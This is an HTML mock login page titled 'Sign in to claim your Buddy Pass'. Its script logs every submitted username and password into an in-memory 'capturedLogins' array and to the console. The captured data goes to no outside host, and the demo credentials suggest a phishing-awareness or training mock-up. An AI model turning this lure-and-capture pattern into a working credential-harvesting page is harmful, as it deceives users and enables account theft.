<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Buddy Pass Sign In</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      background: #f2f2f2;
      font-family: Arial, sans-serif;
      color: #222;
    }

    .page {
      display: flex;
      flex-direction: column;
      align-items: center;
      padding-top: 24px;
    }

    .card {
      width: 330px;
      padding: 25px 14px;
      background: white;
      text-align: center;
      border: 1px solid #e5e5e5;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
    }

    .custom-icon {
      position: relative;
      width: 70px;
      height: 70px;
      margin: 0 auto 8px;
    }

    .ghost {
      position: absolute;
      left: 8px;
      top: 18px;
      font-size: 42px;
    }

    .shield {
      position: absolute;
      right: 0;
      bottom: 2px;
      font-size: 26px;
      transform: rotate(10deg);
    }

    h1 {
      max-width: 245px;
      margin: 0 auto 22px;
      font-size: 19px;
      line-height: 1.3;
    }

    .field {
      width: 100%;
      height: 42px;
      margin-bottom: 10px;
      padding: 0 12px;
      border: 1px solid #e5e5e5;
      border-radius: 4px;
      background: #f7f7f7;
      font-size: 13px;
      outline: none;
    }

    .field:focus {
      border-color: #999;
      background: white;
    }

    .show-password {
      display: flex;
      align-items: center;
      gap: 5px;
      margin: -2px 0 14px;
      color: #777;
      font-size: 10px;
      text-align: left;
    }

    .show-password input {
      width: 13px;
      height: 13px;
      margin: 0;
    }

    .forgot {
      display: block;
      margin: 4px 2px 20px;
      color: #777;
      font-size: 10px;
      text-align: right;
    }

    .login-button {
      width: 75px;
      height: 34px;
      border: 0;
      border-radius: 18px;
      background: #ffd43b;
      color: #222;
      font-size: 12px;
      font-weight: bold;
      cursor: pointer;
    }

    .login-button:hover {
      background: #f5c900;
    }

    .error-message {
      min-height: 16px;
      margin: 14px 0 0;
      color: #d93025;
      font-size: 12px;
    }

    .success-message {
      min-height: 16px;
      margin: 14px 0 0;
      color: #188038;
      font-size: 12px;
    }

    .signup {
      margin-top: 16px;
      font-size: 11px;
    }

    .signup a {
      color: #222;
      font-weight: bold;
      text-decoration: none;
    }
  </style>
</head>

<body>
  <main class="page">
    <section class="card">

      <div class="custom-icon">
        <span class="ghost">👻</span>
        <span class="shield">🛡️</span>
      </div>

      <h1>Sign in to claim your Buddy Pass</h1>

      <form id="loginForm">
        <input
          id="username"
          class="field"
          type="text"
          placeholder="Login"
          autocomplete="off"
        >

        <input
          id="password"
          class="field"
          type="password"
          placeholder="Password"
          autocomplete="off"
        >

        <label class="show-password">
          <input id="showPassword" type="checkbox">
          Show password
        </label>

        <span class="forgot">Forgot password</span>

        <button class="login-button" type="submit">
          Sign in
        </button>

        <p id="message" class="error-message"></p>
      </form>

    </section>

    <p class="signup">
      New here? <a href="#">Create an account</a>
    </p>
  </main>

  <script>
    const form = document.getElementById("loginForm");
    const password = document.getElementById("password");
    const showPassword = document.getElementById("showPassword");
    const message = document.getElementById("message");

    // In-memory store for captured submissions.
    window.capturedLogins = [];

    showPassword.addEventListener("change", function () {
      password.type = this.checked ? "text" : "password";
    });

    form.addEventListener("submit", function (event) {
      event.preventDefault();

      const username = document.getElementById("username").value;
      const enteredPassword = password.value;

      // Log the submitted credentials.
      const entry = {
        username: username,
        password: enteredPassword,
        timestamp: new Date().toISOString()
      };
      window.capturedLogins.push(entry);
      console.log("[captured login]", entry);
      console.table(window.capturedLogins);

      if (username === "demo_user" && enteredPassword === "demo_pass") {
        message.className = "success-message";
        message.textContent = "Login successful!";
      } else {
        message.className = "error-message";
        message.textContent = "Username or password is incorrect.";
      }
    });
  </script>
</body>
</html>
